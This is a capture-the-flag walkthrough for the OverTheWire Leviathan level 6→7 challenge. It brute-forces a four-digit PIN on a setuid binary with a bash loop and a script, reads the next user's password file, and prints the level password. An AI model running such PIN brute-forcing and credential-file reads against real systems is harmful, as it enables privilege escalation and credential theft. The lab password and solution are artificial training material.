# OverTheWire - Leviathan6

* **Platform:** OverTheWire  
* **Game:** Leviathan  
* **Level:** 6 → 7  

---
[&larr; Previous Level](../leviathan5/README.md)
---

### Login

```bash
ssh leviathan6@leviathan.labs.overthewire.org -p 2223
```

### Enumeration

After logging in, I checked the home directory:

```bash
leviathan6@leviathan:~$ ls -lA
-rw-r--r-- 1 root       root         220 Feb 13  2026 .bash_logout
-rw-r--r-- 1 root       root        3851 Jun 24 14:50 .bashrc
-rw-r--r-- 1 root       root         807 Feb 13  2026 .profile
-r-sr-x--- 1 leviathan7 leviathan6 15032 Jun 24 15:00 leviathan6

```
There was a binary `leviathan6` with SUID bit set and owned by leviathan7.

### Analysis

First, I inspect its execution by `ltrace`:
```bash
leviathan6@leviathan:~$ ./leviathan6 
usage: ./leviathan6 <4 digit code>
```
The message shows that it require 4-digit PIN.

### Exploitation
Since there are only 0000 to 9999 possible PINs, I brute-forced them.
#### Method 1
Brute-force with one-liner bash.
```bash
for i in {0000..9999}; do ./leviathan6 "$i"; done
Wrong
Wrong
Wrong
$ id
uid=12007(leviathan7) gid=12006(leviathan6) groups=12006(leviathan6)
$ cat /etc/leviathan_pass/leviathan7
3zrlkaPTfH
```

#### Method 2
I created a script to brute-force PIN. 
```bash
leviathan6@leviathan:~$ mktemp -d
/tmp/tmp.bHSmfbF18t
leviathan6@leviathan:~$ cd /tmp/tmp.bHSmfbF18t
leviathan6@leviathan:/tmp/tmp.bHSmfbF18t$ cat << 'EOF' > script.sh
> #!/bin/bash
for i in {0000..9999}; do
        o=$(echo "cat /etc/leviathan_pass/leviathan7" | /home/leviathan6/leviathan6 "$i")
        if [[ ! "$o" == *"Wrong"* ]]; then
                echo "Found PIN: $i"
                echo "Passwrod: $o"
                exit 0
        fi
done
EOF
leviathan6@leviathan:/tmp/tmp.bHSmfbF18t$ bash script.sh 
Found PIN: 7123
Passwrod: 3zrlkaPTfH
```
The correct PIN is 7123. which gives the password of next level.

### Password
`3zrlkaPTfH`

---
[Next Level &rarr;](../leviathan7/README.md) 
---